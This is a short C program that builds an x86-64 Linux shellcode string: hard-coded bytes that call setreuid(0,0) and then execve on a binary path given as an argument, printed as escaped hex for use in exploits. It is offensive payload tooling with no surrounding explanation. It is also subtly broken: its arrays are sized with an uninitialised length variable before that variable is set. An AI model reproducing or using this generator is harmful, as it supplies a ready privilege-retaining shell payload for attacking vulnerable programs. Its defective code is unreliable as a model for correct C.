#include <stdio.h>
#include <string.h>
#define LEN_SKELETON 189
 
int main(int argc, char **argv)
{
	int i;
	size_t len; 
	unsigned char shellcode[LEN_SKELETON + len*4 + 1];
	unsigned char program[len*4+1];
  
  if(argc < 2)
  {
    printf("Usage: %s <path/to/bin>\n", argv[0]);
    return 1;
  }
  
  len = strlen(argv[1]);
	
	snprintf(shellcode, LEN_SKELETON, "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6"
									                  "\\x48\\x31\\xd2\\xb0\\x71\\x0f\\x05\\x48\\x31"
									                  "\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\xeb\\x0f"
									                  "\\x5f\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6"
                									  "\\x48\\x83\\xc0\\x3b\\x0f\\x05\\xe8\\xec\\xff\\xff\\xff");
 	for(i=0;i<len;i++)
  {
  	snprintf(&program[i*4], sizeof(program)-(i*4),"\\x%02x", (unsigned char*)argv[1][i]);
  }		

  len *= 4;
  program[len] = '\0';	

	strncat(shellcode, program, len);
	
	shellcode[LEN_SKELETON + len]='\0';
	
	printf("%s\n", shellcode);
	
	return 0;
}
